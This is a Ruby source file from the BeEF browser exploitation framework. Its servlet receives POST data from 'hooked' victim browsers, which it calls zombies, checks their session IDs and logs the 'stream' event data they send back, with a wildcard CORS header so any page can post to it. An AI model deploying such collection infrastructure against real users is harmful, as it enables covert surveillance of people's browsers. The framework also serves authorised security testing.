module BeEF
  
  #
  # The http handler that manages the Events.
  #
  class EventHandler < WEBrick::HTTPServlet::AbstractServlet
    
    attr_reader :guard
    
    H = BeEF::Models::Http
    Z = BeEF::Models::Zombie
    
    #
    # Class constructor
    #
    def initialize(config)
      # we set up a mutex
      @guard = Mutex.new
    end
    
    #
    # This function receives any POST http requests. We only
    # allow the hooked browser to send back results using POST.
    #
    def do_POST(request, response)
      @params = request.query
      
      # validates the hook token
      #beef_hook = request.query['BEEFHOOK'] || nil
      beef_hook = request.get_hook_session_id()
      raise WEBrick::HTTPStatus::BadRequest, "beef_hook is null" if beef_hook.nil?

      # validates that a hooked browser with the beef_hook token exists in the db
      zombie = Z.first(:session => beef_hook) || nil
      raise WEBrick::HTTPStatus::BadRequest, "Invalid beef hook id: the hooked browser cannot be found in the database" if zombie.nil?
      
      #event_string = request.query['event_string'] || nil
      #raise WEBrick::HTTPStatus::BadRequest, "event_string is null" if event_string.nil?
      
      @params.each{|k,v|
          if k[0..5] == "stream"
            BeEF::Logger.instance.register('Event', v, zombie.id)    
          end
      }
      
      #BeEF::Logger.instance.register('Zombie', "#{zombie.ip}: #{event_string}", "#{zombie.id}")
      
      response.set_no_cache()
      response.header['Content-Type'] = 'text/javascript' 
      response.header['Access-Control-Allow-Origin'] = '*'
      response.header['Access-Control-Allow-Methods'] = 'POST'
      response.body = ''
    end
    
  end
  
end